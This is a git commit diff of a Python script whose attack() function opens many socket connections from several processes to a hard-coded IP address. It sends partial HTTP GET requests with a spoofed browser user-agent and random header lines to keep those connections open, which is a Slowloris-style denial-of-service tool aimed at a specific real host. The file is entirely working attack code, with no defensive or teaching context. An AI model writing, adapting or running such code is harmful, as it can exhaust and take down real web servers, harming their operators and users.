a2c749f16e45488d54bae4808ace1f31aabf594b
Dawood <dawood.aijaz97@gmail.com>
2019-08-29 17:59:10 +0500

    #

--- index.py
+++ index.py
@@ -2,16 +2,16 @@ import socket
 import time
 import multiprocessing
 import os
-
-no_of_process = 3
+import random
+no_of_process = 2
 list_process = []
 host = "144.217.100.106"
 port = 8080
-
+user_agent = "User-agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n"
 
 def attack():
     connections = []
-    data = "google"
+    data = f"X-a:{random.randint(1,4000)}\r\n"
 
     def create_connection():
         my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -19,6 +19,8 @@ def attack():
             pid = os.getpid()
             print(f"Connecting from Process{pid}")
             my_socket.connect((host, port))
+            my_socket.send(f"GET /?{random.randint(0,120)} HTTP/1.1\r\n".encode("utf-8"))
+            my_socket.send(user_agent.encode("utf-8"))
             return my_socket
 
         except socket.error:
@@ -28,7 +30,7 @@ def attack():
     def send_data():
         for x in connections:
             try:
-                x.send(data.encode())
+                x.send(data.encode("utf-8"))
                 receive_data = x.recv(1024)
                 print(f"Data from server:{receive_data}")
             except socket.error as msg:
